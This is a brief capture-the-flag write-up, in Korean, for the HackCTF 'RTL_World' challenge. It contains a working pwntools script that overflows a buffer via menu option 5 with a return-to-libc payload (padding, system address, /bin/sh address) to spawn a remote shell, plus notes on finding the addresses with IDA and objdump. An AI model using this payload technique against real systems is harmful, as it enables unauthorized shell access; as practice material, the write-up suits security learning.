# HACKCTF 
## RTL_World  
~~~python
from pwn import *
r = remote("ctf.j0n9hyun.xyz",3010)
system=0x080485b0
binsh=0x8048eb1

r.recv(1024)
r.sendline("5")
r.recvuntil("[Attack] > ")
payload = 'A'*144+p32(system)+'A'*4+p32(binsh)
r.sendline(payload)
r.interactive()
~~~
우선 nc를 통해 실행시켜봤더니 엄~~청 복잡하다.
우선 입력할 수 있는 부분을 먼저 찾으니 선택부분과 5번 kill 부분에서 입력 가능하다.
case 5에서는 read 함수로 buf에 입력을 받음으로 여기서 공격이 가능하다.
또한 아이다에서 system 함수의 주소를 얻었다.
system 함수의 인자로 사용될 bin/sh값을 objdump } grep /bin/sh 함수로 찾아준다.
이제 payload를 dummy(144) | system 주소 | ret(4) | binsh 주소 이렇게 구성시켜주면
shell을 얻을 수 있다. 롸이트업을 계속 보고 하게 된다ㅠㅠ
